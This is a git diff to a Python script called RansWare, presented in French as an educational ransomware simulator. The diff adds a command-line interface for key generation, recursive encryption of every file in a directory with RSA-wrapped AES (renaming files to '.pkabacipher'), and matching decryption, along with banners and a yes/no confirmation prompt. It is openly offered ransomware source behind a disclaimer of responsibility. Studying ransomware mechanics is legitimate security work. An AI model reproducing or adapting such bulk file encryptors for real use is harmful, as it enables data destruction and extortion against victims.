@@ -4,16 +4,84 @@ Github: http://github.com/alexispondo/
 Linkedin: https://www.linkedin.com/in/alexis-pondo/
 
 Note: Ce programe est à but éducatif, en effet il a été écrit pour comprendre le fonctionnement des ransomware, comment le chiffrement sous-jacent fonctionne et comment il se propage sur une machine.
-      Je ne suis en aucun cas reponsable de tous ce que vous ferrez avec.
+      Je ne suis en aucun cas reponsable de tous ce que vous ferez avec.
+
+Usage:
+    python3 RansWare.py gen_key
+    python3 RansWare.py enc --dir "/home/alexispondo/Téléchargements/bibliothequePHP-master (copie 1)" --pub_key /home/alexispondo/HACK_LOG/PERSO/ransomware/public
+    python3 RansWare.py dec --dir "/home/alexispondo/Téléchargements/bibliothequePHP-master (copie 1)" --priv_key /home/alexispondo/HACK_LOG/PERSO/ransomware/private --mdp /home/alexispondo/HACK_LOG/PERSO/ransomware/password
+
 """
 
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
-import os
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+import os
+import random
 
+import argparse
+from termcolor import cprint
+
+
+print_blue = lambda x: cprint(x, 'blue')
+print_red = lambda x: cprint(x, "red")
+print_green =  lambda x: cprint(x, "green")
+print_yellow = lambda x: cprint(x, "yellow")
+print_yellow_bold = lambda x: cprint(x, "yellow", attrs=['bold'])
+print_red_bold = lambda x: cprint(x, "red", attrs=['bold'])
+
+
+def banner():
+    infos = """
+    [+] Name: RansWare
+    [+] Version: 1.0
+    [+] Github: https://github.com/alexispondo/RansWare
+    [+] Linkedin: https://www.linkedin.com/in/alexis-pondo/
+    """
+    var1 = """
+ ██▀███   ▄▄▄       ███▄    █   ██████  █     █░ ▄▄▄       ██▀███  ▓█████ 
+▓██ ▒ ██▒▒████▄     ██ ▀█   █ ▒██    ▒ ▓█░ █ ░█░▒████▄    ▓██ ▒ ██▒▓█   ▀ 
+▓██ ░▄█ ▒▒██  ▀█▄  ▓██  ▀█ ██▒░ ▓██▄   ▒█░ █ ░█ ▒██  ▀█▄  ▓██ ░▄█ ▒▒███   
+▒██▀▀█▄  ░██▄▄▄▄██ ▓██▒  ▐▌██▒  ▒   ██▒░█░ █ ░█ ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄ 
+░██▓ ▒██▒ ▓█   ▓██▒▒██░   ▓██░▒██████▒▒░░██▒██▓  ▓█   ▓██▒░██▓ ▒██▒░▒████▒
+░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░░ ▓░▒ ▒   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░
+  ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░  ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░
+  ░░   ░   ░   ▒      ░   ░ ░ ░  ░  ░    ░   ░    ░   ▒     ░░   ░    ░   
+   ░           ░  ░         ░       ░      ░          ░  ░   ░        ░  ░
+"""+infos+"""
+    """
+
+    var2 = """
+ ______     ______     __   __     ______     __     __     ______     ______     ______    
+/\  == \   /\  __ \   /\ "-.\ \   /\  ___\   /\ \  _ \ \   /\  __ \   /\  == \   /\  ___\   
+\ \  __<   \ \  __ \  \ \ \-.  \  \ \___  \  \ \ \/ ".\ \  \ \  __ \  \ \  __<   \ \  __\   
+ \ \_\ \_\  \ \_\ \_\  \ \_\\"\_\  \/\_____\  \ \__/".~\_\  \ \_\ \_\  \ \_\ \_\  \ \_____\ 
+  \/_/ /_/   \/_/\/_/   \/_/ \/_/   \/_____/   \/_/   \/_/   \/_/\/_/   \/_/ /_/   \/_____/ 
+                                                                                            
+"""+infos+"""
+    """
+
+    var3 = """
+ .S_sSSs     .S_SSSs     .S_sSSs      sSSs   .S     S.    .S_SSSs     .S_sSSs      sSSs  
+.SS~YS%%b   .SS~SSSSS   .SS~YS%%b    d%%SP  .SS     SS.  .SS~SSSSS   .SS~YS%%b    d%%SP  
+S%S   `S%b  S%S   SSSS  S%S   `S%b  d%S'    S%S     S%S  S%S   SSSS  S%S   `S%b  d%S'    
+S%S    S%S  S%S    S%S  S%S    S%S  S%|     S%S     S%S  S%S    S%S  S%S    S%S  S%S     
+S%S    d*S  S%S SSSS%S  S%S    S&S  S&S     S%S     S%S  S%S SSSS%S  S%S    d*S  S&S     
+S&S   .S*S  S&S  SSS%S  S&S    S&S  Y&Ss    S&S     S&S  S&S  SSS%S  S&S   .S*S  S&S_Ss  
+S&S_sdSSS   S&S    S&S  S&S    S&S  `S&&S   S&S     S&S  S&S    S&S  S&S_sdSSS   S&S~SP  
+S&S~YSY%b   S&S    S&S  S&S    S&S    `S*S  S&S     S&S  S&S    S&S  S&S~YSY%b   S&S     
+S*S   `S%b  S*S    S&S  S*S    S*S     l*S  S*S     S*S  S*S    S&S  S*S   `S%b  S*b     
+S*S    S%S  S*S    S*S  S*S    S*S    .S*P  S*S  .  S*S  S*S    S*S  S*S    S%S  S*S.    
+S*S    S&S  S*S    S*S  S*S    S*S  sSS*S   S*S_sSs_S*S  S*S    S*S  S*S    S&S   SSSbs  
+S*S    SSS  SSS    S*S  S*S    SSS  YSS'    SSS~SSS~S*S  SSS    S*S  S*S    SSS    YSSP  
+SP                 SP   SP                                      SP   SP                  
+Y                  Y    Y                                       Y    Y                   
+    
+"""+infos+"""
+    """
+    return random.choice([var1, var2, var3])
 
 #############################################################################################################################
 ################################################## Symetric Cryptography ####################################################
@@ -164,7 +232,7 @@ def sym_decipher_data(file_cipher, key_cipher,  private_key):
 
 
 #############################################################################################################################
-################################################# Asymetric cryptography ###################################################
+################################################# Asymetric Cryptography ###################################################
 #############################################################################################################################
 
 # On genère une clé privé/publique de taille "size"
@@ -186,7 +254,7 @@ def load_private_key(private_key_file):
     return private_key
 
 # Fonction permettant de serialiser une clé privée (l'enregistrer dans un fichier)
-def serialyse_private_key(private_key, output):
+def serialize_private_key(private_key, output):
     pem = private_key.private_bytes(
         encoding=serialization.Encoding.PEM,
         format=serialization.PrivateFormat.PKCS8,
@@ -256,41 +324,57 @@ def dech(private_key, file):
 #############################################################################################################################
 #############################################################################################################################
 
-def crypter(public_key_file, mdp):
-    print(os.getcwd())
-    #public_key = load_public_key(public_key_file)
-    print("\nVous avez choisi de chiffrer les fichier du disque")
-    print("Veuillez entrer le dossier racine à partir duquel les fichiers serons chiffrer de manière recursive")
-    print("ex: D:\\my_dir\\, /home/user/dir/ ...")
-    dir = str(input("Entrer le chemin du dossier > "))
+def crypter(dir, public_key_file, mdp):
     if os.path.isdir(dir):
         for (current_dir, list_dir, files) in os.walk(dir):
             for f in files:
                 path_file = current_dir + "/" + f
-                #try:
-                sym_cipher_data(path_file, public_key_file, mdp)
-                    #ch(public_key, path_file)
-                #except Exception as e:
-                #    print(e)
+                print(path_file)
+        print("\nLes fichiers Listés seront crypté voulez vous continuer ?")
+        continuer = str(input("O/N >> "))
+        if continuer.lower() == "o":
+            print("\nDebut du chiffrement...\n")
+            for (current_dir, list_dir, files) in os.walk(dir):
+                for f in files:
+                    path_file = current_dir + "/" + f
+                    print_blue("Ancien = {}".format(path_file))
+                    try:
+                        sym_cipher_data(path_file, public_key_file, mdp)
+                        path_file_c = path_file + ".pkabacipher"
+                        print_green("Nouveau = {}".format(path_file_c))
+                        #ch(public_key, path_file)
+                    except Exception as e:
+                        print(e)
+            print("\nFin du chiffrement...")
+        else:
+            print("\nChiffrement annulé...")
     else:
         print("\nDésolé vous avez entrez un dossier inexistant :(")
 
-def decrypter(private_key_file):
-    print(os.getcwd())
-    #private_key = load_private_key(private_key_file)
-    print("\nVous avez choisi de dechiffrer les fichier du disque")
-    print("Veuillez entrer le dossier racine à partir duquel les fichiers sont chiffrer pour debuter le decryptage des fichiers")
-    print("ex: D:\\my_dir\\, /home/user/dir/ ...")
-    dir = str(input("Entrer le chemin du dossier > "))
+def decrypter(dir, private_key_file, mdp):
     if os.path.isdir(dir):
         for (current_dir, list_dir, files) in os.walk(dir):
             for f in files:
                 path_file = current_dir + "/" + f
-                #try:
-                    #dech(private_key, path_file)
-                sym_decipher_data(path_file, "password", private_key_file)
-                #except Exception as e:
-                #    print(e)
+                print(path_file)
+        print("\nLes fichiers Listés seront decrypté (assurez vous d'avoir l'extention \".pkabacipher\" avant de les dechiffrer. voulez vous continuer ?")
+        continuer = str(input("O/N >> "))
+        if continuer.lower() == "o":
+            print("\nDebut du dechiffrement...\n")
+            for (current_dir, list_dir, files) in os.walk(dir):
+                for f in files:
+                    path_file = current_dir + "/" + f
+                    print_blue("Ancien = {}".format(path_file))
+                    try:
+                        #dech(private_key, path_file)
+                        sym_decipher_data(path_file, mdp, private_key_file)
+                        path_file_c = ".".join(str(path_file).split(".")[:-1])
+                        print_green("Nouveau = {}".format(path_file_c))
+                    except Exception as e:
+                        print(e)
+            print("\nFin du dechiffrement...")
+        else:
+            print("\nDechiffrement annulé...")
     else:
         print("\nDésolé vous avez entrez un dossier inexistant :(")
 
@@ -300,29 +384,57 @@ def main():
         choix= input("1:crypter, 2:decrypter > ")
         if choix == "1":
             mdp = gen_passw() # On genere notre password
-            crypter("public_key", mdp)
+            crypter("/hojjhme", "public_key", mdp)
         elif choix == "2":
             decrypter("private_key")
 
-main()
+#main()
 
 
-"""
-def test_function():
-    priv_k = generer_private_key(4096)
-    print("priv = ", priv_k)
-    pub_k = get_public_key(priv_k)
-    print("pub = ", pub_k)
-    serialize_public_key(pub_k, "public")
-    serialyse_private_key(priv_k, "private")
+parser = argparse.ArgumentParser(description="Systeme de chiffrement/dechiffrement de fichier simulant un ransonware")
+subparser = parser.add_subparsers(dest='command')
 
-    print("\n\nChargement...")
-    priv_k1 = load_private_key("private")
-    print("priv1 = ", priv_k1)
+gen_key = subparser.add_parser('gen_key',help="Générer une paire de clé: (clé privée / clé publique)") # Choisir de générer une paire de clé privée/publique
+enc = subparser.add_parser('enc', help="Crypter les fichiers d'un repertoire de façon recursive") # Choisir de faire le chiffrement
+dec = subparser.add_parser('dec', help="Décrypter les fichiers d'un repertoire de façon recursive") # Choisir de faire le dechifrement
 
-    pub_k1 = load_public_key("public")
-    print("pub1 = ", pub_k1)
+enc.add_argument("--dir", type=str, required=True, help="Spécifier le chemin du repertoire à partir duquel commencer le cryptage") # Spécifier le dossier racine de chiffrement
+enc.add_argument("--pub_key", type=str, required=True, help="Spécifier le chemin de la clé publique l'ors du cryptage") # Spécifier la clé publique pour le chiffrement
 
-    serialize_public_key(pub_k1, "public1")
-    serialyse_private_key(priv_k1, "private1")
-"""
+dec.add_argument("--dir", type=str, required=True, help="Spécifier le chemin du repertoire à partir duquel commencer le decryptage") # Spécifier le dossier racine de dechiffrement
+dec.add_argument("--priv_key", type=str, required=True, help="Spécifier le chemin de la clé privée l'ors du decryptage") # Spécifier la clé privée pour le dechiffrement
+dec.add_argument("--mdp", type=str, required=True, help="Spécifier le chemin du fichier de mot de passe l'ors du decryptage") # Spécifier le fichier de mot de passe pour le dechiffrement
+
+args = parser.parse_args()
+print_yellow_bold(banner())
+if args.command == 'gen_key':
+    print('Génération des clés...')
+
+    serialize_private_key(generer_private_key(4096),"private")
+    print("\nClé Privée: {}".format(os.getcwd() + "/private"))
+    print("####################################################################################")
+    with open("private", "r") as pri:
+        print(pri.read())
+    print("####################################################################################")
+
+
+    serialize_public_key(get_public_key(load_private_key("private")),"public")
+    print("\nClé Publique: {}".format(os.getcwd() + "/public"))
+    print("####################################################################################")
+    with open("public", "r") as pub:
+        print(pub.read())
+    print("####################################################################################")
+
+    print("\n==== La paire de clé a été générée ==== \nGénération terminé... ")
+
+elif args.command == 'enc':
+    dir = args.dir
+    pub_key = args.pub_key
+    mdp = gen_passw()  # On genere notre password aleatoirement pour le chiffrement symetrique
+    crypter(dir, pub_key, mdp)
+elif args.command == 'dec':
+    dir = args.dir
+    priv_key = args.priv_key
+    mdp = args.mdp
+    decrypter(dir,priv_key,mdp)
+    #print('dir= ', args.dir , "priv_key= ", args.priv_key )
